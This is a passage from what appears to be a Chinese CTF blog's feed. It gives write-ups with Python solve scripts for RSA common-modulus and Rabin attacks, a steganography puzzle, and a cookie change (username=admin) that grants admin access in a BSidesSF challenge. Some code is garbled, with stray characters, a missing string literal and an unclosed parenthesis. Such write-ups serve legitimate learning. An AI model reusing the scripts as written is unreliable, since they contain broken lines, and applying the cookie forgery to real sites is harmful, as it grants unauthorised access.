class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br></pre></td></tr></table></figure><p>这就很明显了，对相同的明文，利用相同的模数<code>n</code>，不同的<code>e</code>进行加密，显然的共模攻击。<br>直接上脚本了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)个字符</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure><p>关于RSA攻击的一些常见题目，可以参考<a href="https://xz.aliyun.com/t/6459">这里</a>。</p><h2 id="Crypto-warm-up"><a href="#Crypto-warm-up" class="headerlink" title="Crypto-warm_up"></a>Crypto-warm_up</h2><p>一道RSA攻击题，比赛的时候用了很久的时间，结果方法是那个方法，也没毛病，但是拿到的中间解密结果就是跟正确的不一样…<br>【补充】后来得知是利用<a href="https://blog.csdn.net/jcbx_/article/details/101066670">Rabin算法</a>来解密，</p><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先拿到加密的脚本：<br><code>challenge</code>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encode <span class="keyword">import</span> KEY</span><br><span class="line"></span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s=getPrime(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">e1=<span class="number">125794</span></span><br><span class="line">e2=<span class="number">42373</span></span><br><span class="line"></span><br><span class="line">n1=p*q</span><br><span class="line"><span class="comment"># p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599</span></span><br><span class="line"><span class="comment"># q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279</span></span><br><span class="line">n2=p*r</span><br><span class="line"><span class="comment"># r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829</span></span><br><span class="line">n3=p*q*s</span><br><span class="line"><span class="comment"># s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546</span></span><br><span class="line">c1=pow(s,e1,n1)</span><br><span class="line">Key=int(KEY.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">key_encode=pow(Key,e2,n3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"enc"</span>,<span class="string">"a"</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">"c1: "</span>+str(c1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n1: "</span>+str(n1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n2: "</span>+str(n2)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"key_encode: "</span>+str(key_encode)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p><code>encode</code>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = os.urandom(len(flag))</span><br><span class="line"></span><br><span class="line">dec=int(flag.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(bin(dec)[<span class="number">2</span>:])==<span class="number">335</span></span><br><span class="line">mask=int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec=(dec^dec&lt;&lt;<span class="number">200</span> )&amp;mask</span><br><span class="line">enc=dec^bytes_to_long(KEY)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"enc: "</span>+str(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br></pre></td></tr></table></figure><p>审计代码可知，要拿到flag，我们首先需要拿到<code>KEY</code>，而<code>KEY</code>是经过RSA加密的。<br>但是观察RSA代码发现<code>n1</code>和<code>n2</code>有公约数<code>p</code>，利用欧几里何算法即可求得：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(m,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:         <span class="comment">#考虑特殊情况</span></span><br><span class="line">        print(<span class="string">"n is not equal 0!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> m%n!=<span class="number">0</span>:</span><br><span class="line">            new=m</span><br><span class="line">            m=n</span><br><span class="line">            n=new%n</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><p>这样我们就有了<code>p</code>、<code>q</code>、<code>r</code>，但是要得到<code>KEY</code>，我们需要拿到<code>s</code>，这个地方参考了网上的<a href="https://www.anquanke.com/post/id/164575#h2-4">一篇文章</a>中的一部分来求，但是求得的<code>s</code>不是<code>1500</code>bit、但是加密的密文却是一样的…然后也就没有做下去了，等WP吧…<br>后来一位师傅分享了自己的总结，学习下吧：<br><a href="http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a><br>师傅给了他的脚本做参考，但是还没完全搞明白，等WP出来研究好了再补充。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>利用<code>Rabin</code>算法解密RSA部分，然后利用运算的特性将<code>dec=(dec^dec&lt;&lt;200)&amp;mask</code>通过<code>dec=(dec^dec&gt;&gt;200)&amp;mask</code>进行还原，解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855</span></span><br><span class="line">n1 = <span class="number">15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121</span></span><br><span class="line">n2 = <span class="number">16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571</span></span><br><span class="line">key_encode = <span class="number">154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993</span></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q = n1/p</span><br><span class="line">e1 = <span class="number">125794</span></span><br><span class="line">e2 = <span class="number">42373</span></span><br><span class="line">b = gmpy2.gcd(e1, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">bd = gmpy2.invert(e1/b, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">s = pow(c1, bd, n1)</span><br><span class="line"></span><br><span class="line">u = pow(s,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">v = pow(s,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">s = gmpy2.invert(p,q)</span><br><span class="line">t = gmpy2.invert(q,p)</span><br><span class="line">x = (t*q*u+s*p*v)%n1</span><br><span class="line">x2 = -x%n1</span><br><span class="line">y = (t*q*u-s*p*v)%n1</span><br><span class="line">y2 = -y%n1</span><br><span class="line">might_s = [x, x2, y, y2]</span><br><span class="line">might_d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> might_s:</span><br><span class="line">    might_d.append(int(gmpy2.invert(e2, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(i<span class="number">-1</span>))))</span><br><span class="line"></span><br><span class="line">might_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    might_key.append(pow(key_encode, might_d[i], p*q*might_s[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="number">17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br><span class="line">key = <span class="number">42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276</span></span><br><span class="line">dec = key^enc</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br><span class="line">mask = int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec = (dec ^ dec&gt;&gt;<span class="number">200</span>)&amp;mask</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br></pre></td></tr></table></figure><h2 id="Misc-code-in-morse"><a href="#Misc-code-in-morse" class="headerlink" title="Misc-code_in_morse"></a>Misc-code_in_morse</h2><p>考察基本的流量分析、morse编码，base32解码转图片，PDF417图片的识别以及F5隐写。</p><h3 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h3><p>拿到流量包之后导出<code>HTTP</code>数据，发现一共四个文件，在<code>PNG</code>文件中拿到了morse码，到网站解码得到一串base32码，这个时候到网站上解base32解不出来，就用python解了一下，发现是一堆hex，其中还有<code>PNG</code>字样，断定是图片的数据，写了个脚本导入到<code>png</code>图片：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">b32 = <span class="stringspan></span><br><span class="line">hex = base64.b32decode(b32)</span><br><span class="line">print(hex)</span><br><span class="line">f1 = open(<span class="string">"1.png"</span>,<span class="string">'wb'</span>)</span><br><span class="line">f1.write(hex)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>然后拿到了如下一张图：<br><img src="http://www.ggb0n.cool/images/ichunqiu23.png" alt=""><br>后来得知是<code>PDF417</code>，然后到网上找了一下扫描的方法，<a href="https://online-barcode-reader.inliteresearch.com/">这里</a>和<a href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx">这里</a>都可以识别，识别出了下面这个图：<br><img src="http://www.ggb0n.cool/images/ichunqiu24.jpg" alt=""><br>这里卡了好久，要不是就拿到了二血了…<br>后来看到图片的标题<code>F5</code>得知是<code>F5</code>隐写，然后用<a href="https://github.com/matthewgao/F5-steganography">F5-steganography</a>跑出了flag。<br><img src="http://www.ggb0n.cool/images/ichunqiu1.png" alt=""></p><p>这里偶然间发现了一个更好用的工具，输入morse码就直接出了PDF417的图，分享一下：<a href="https://gchq.github.io/CyberChef/">CyberChef</a>，只能说，师傅们tql!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近的几个公益赛确实办的不错，安全人员也都是很热爱祖国的♥，中国加油😠 武汉加油😠 大家加油😠
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="反序列化漏洞" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="反序列化逃逸漏洞" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="SSRF" scheme="http://ggb0n.cool/tags/SSRF/"/>
    
      <category term="堆叠注入" scheme="http://ggb0n.cool/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
      <category term="SSTI" scheme="http://ggb0n.cool/tags/SSTI/"/>
    
      <category term="RSA攻击" scheme="http://ggb0n.cool/tags/RSA%E6%94%BB%E5%87%BB/"/>
    
      <category term="时间盲注" scheme="http://ggb0n.cool/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    
      <category term="宽字节注入" scheme="http://ggb0n.cool/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    
      <category term="利用正则注入" scheme="http://ggb0n.cool/tags/%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5/"/>
    
      <category term="利用Handler注入" scheme="http://ggb0n.cool/tags/%E5%88%A9%E7%94%A8Handler%E6%B3%A8%E5%85%A5/"/>
    
      <category term="利用预处理语句进行堆叠注入" scheme="http://ggb0n.cool/tags/%E5%88%A9%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
      <category term="多列数据爆破注入" scheme="http://ggb0n.cool/tags/%E5%A4%9A%E5%88%97%E6%95%B0%E6%8D%AE%E7%88%86%E7%A0%B4%E6%B3%A8%E5%85%A5/"/>
    
      <category term="PDF417识别" scheme="http://ggb0n.cool/tags/PDF417%E8%AF%86%E5%88%AB/"/>
    
      <category term="F5隐写" scheme="http://ggb0n.cool/tags/F5%E9%9A%90%E5%86%99/"/>
    
      <category term="ThinkPHP6.0-通过SEESION写文件漏洞" scheme="http://ggb0n.cool/tags/ThinkPHP6-0-%E9%80%9A%E8%BF%87SEESION%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Rabin算法攻击" scheme="http://ggb0n.cool/tags/Rabin%E7%AE%97%E6%B3%95%E6%94%BB%E5%87%BB/"/>
    
      <category term="RSA共模攻击" scheme="http://ggb0n.cool/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    
      <category term="JS原型链污染" scheme="http://ggb0n.cool/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
      <category term="CRLF注入" scheme="http://ggb0n.cool/tags/CRLF%E6%B3%A8%E5%85%A5/"/>
    
      <category term="JavaScript" scheme="http://ggb0n.cool/tags/JavaScript/"/>
    
      <category term="NodeJS" scheme="http://ggb0n.cool/tags/NodeJS/"/>
    
      <category term="NodeJS编码安全" scheme="http://ggb0n.cool/tags/NodeJS%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BSidesSF2019-WriteUp</title>
    <link href="http://ggb0n.cool/2020/02/18/BSidesSF2019-WriteUp/"/>
    <id>http://ggb0n.cool/2020/02/18/BSidesSF2019-WriteUp/</id>
    <published>2020-02-18T12:47:27.000Z</published>
    <updated>2020-04-22T00:13:00.809Z</updated>
    
    <content type="html"><![CDATA[<p>最近BUU复现了BSidesSF2019几道题目，还比较简单，记录一下。<a id="more"></a></p><h2 id="Futurella"><a href="#Futurella" class="headerlink" title="Futurella"></a>Futurella</h2><p>一道查看源码就能拿到flag的题目，令人开心的题目。<br>不过谷歌翻译是真的强，连这种火星文都能翻译<br><img src="http://www.ggb0n.cool/images/BUUCTF-web86.png" alt=""></p><h2 id="Kookie"><a href="#Kookie" class="headerlink" title="Kookie"></a>Kookie</h2><p>简单的利用cookie拿admin权限的题目。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入题目发现提示我们要以<code>admin</code>身份登录，但同时也给了一组用户名和密码<code>guest/guest</code>，用该用户登录抓包，发现cookie中存在字段<code>username=</code>，在后面加上<code>admin</code>然后放包即可拿到flag。</p><h2 id="Pick-tac-toe"><a href="#Pick-tac-toe" class="headerlink" title="Pick-tac-toe"></a>Pick-tac-toe</h2><p>考察条件竞争，题很简单。</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>进入题目是一个下井字棋的棋盘，查看源码，发现一部分代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">"board"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_ul'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'ul'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'ul'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_ul").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_u'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'u'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'u'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_u").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_ur'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'ur'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'ur'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_ur").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_l'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'l'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'l'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_l").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_c'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'c'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'c'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_c").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_r'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'r'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'r'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_r").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_bl'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'bl'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'bl'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_bl").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_b'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'b'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'b'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_b").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 